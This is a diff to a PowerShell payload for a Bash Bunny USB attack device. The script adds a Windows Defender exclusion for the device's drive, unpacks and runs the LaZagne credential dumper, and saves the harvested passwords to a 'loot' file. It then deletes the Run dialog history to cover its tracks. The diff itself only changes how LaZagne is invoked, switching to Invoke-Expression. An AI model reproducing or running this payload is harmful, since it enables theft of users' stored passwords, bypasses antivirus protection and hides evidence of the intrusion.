@@ -27,7 +27,7 @@ Add-MpPreference -ExclusionPath "$BashBunnyLabel"
 Expand-Archive -Force $BashBunnyLabel\LaZagne.zip $BashBunnyLabel\LaZagne
 
 # Define variable for the path to LaZagne + execution arguments
-$LaZagnePath = & $BashBunnyLabel\LaZagne\LaZagne.exe $ExeArgs
+$LaZagnePath = $BashBunnyLabel\LaZagne\LaZagne.exe $ExeArgs
 
 # Create the loot folder in the "\loot\LaZassword\" directory
 New-Item -ItemType Directory -Force -Path $BashBunnyLabel\loot\LaZassword\$foldername
@@ -36,7 +36,7 @@ New-Item -ItemType Directory -Force -Path $BashBunnyLabel\loot\LaZassword\$folde
 $lootfile = "$BashBunnyLabel\loot\lazassword\$foldername\$filename.txt"
 
 # Execute LaZagne and save the output in the loot file
-$LaZagnePath | Out-File -FilePath $lootfile
+Invoke-Expression $LaZagnePath | Out-File -FilePath $lootfile
 
 # Delete the run (win+r) history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
